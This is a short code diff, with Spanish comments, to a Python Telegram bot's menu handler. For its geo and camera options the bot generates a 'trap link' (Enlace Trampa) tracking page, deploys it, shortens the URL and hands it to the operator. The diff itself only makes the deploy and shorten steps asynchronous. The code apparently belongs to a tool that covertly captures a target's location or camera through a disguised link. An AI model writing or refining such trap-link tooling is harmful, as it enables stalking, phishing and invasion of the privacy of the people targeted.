@@ -56,15 +56,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Manejo especial para trackers (acciones inmediatas)
     elif data in ['menu_geo', 'menu_cam']:
-        await query.edit_message_text("⚙️ <b>Generando Enlace Trampa...</b>", parse_mode='HTML')
+        await query.edit_message_text("⚙️ <b>Generando Enlace Trampa...</b>\n<i>(Esto puede tardar unos segundos)</i>", parse_mode='HTML')
         
         type_ = "geo" if data == 'menu_geo' else "cam"
         fname, html = generate_tracking_page(BOT_TOKEN, query.message.chat_id, type_)
         
-        # Deploy
-        url = deploy_html(html, fname)
+        # Deploy (Asíncrono para no bloquear el bot)
+        url = await deploy_html(html, fname)
+        
         if url:
-            short = shorten_url(url)
+            short = await shorten_url(url)
             msg = (
                 f"✅ <b>Enlace Generado ({type_.upper()})</b>\n\n"
                 f"🔗 <code>{short}</code>\n\n"
